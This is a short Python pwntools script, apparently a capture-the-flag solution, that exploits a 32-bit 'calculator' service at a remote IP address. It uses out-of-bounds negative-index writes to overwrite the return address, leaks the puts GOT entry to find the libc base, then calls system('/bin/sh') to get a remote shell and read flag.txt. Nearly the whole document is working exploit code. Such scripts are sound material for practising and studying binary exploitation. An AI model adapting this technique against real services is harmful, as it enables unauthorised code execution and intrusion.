from pwn import *

r = remote("139.180.137.27", 2225)

def add(number, index):
    #add a number to the calculator at given index
    r.recvuntil('Your choice: ')
    r.sendline('1')
    r.recvuntil('Number: ')
    r.sendline(number)
    r.recvuntil('Index: ')
    r.sendline(index)


elf = ELF('./calculator')
libc = ELF('./libc-2.23.so')
puts_plt_addr = 0x8048440
puts_got_addr = 0x804a014
puts_off = libc.symbols["puts"]
system_off = libc.symbols["system"]
bin_sh_off = next(libc.search("/bin/sh"))

#overwrite the return address for base_libc leaking
add(str(puts_plt_addr), '-8')
add('134514075', '-7')
add(str(puts_got_addr), '-6')

r.recvuntil('Your choice: ')
r.sendline('3')
r.recvuntil('Goodbye!\n')

base_libc = u32(r.recv(4)) - puts_off
system_addr = base_libc + system_off
#take the negative value of the addresses
if (system_addr > 0x7fffffff):
    system_addr = system_addr - 4294967296
bin_sh_addr = base_libc + bin_sh_off
if (bin_sh_addr > 0x7fffffff):
    bin_sh_addr = bin_sh_addr - 4294967296

#overwrite the return address again to get shell
add(str(system_addr), '-8')
add(str(bin_sh_addr), '-6')
r.recvuntil('Your choice: ')
r.sendline('3')
r.sendline('cat flag.txt')
r.interactive()

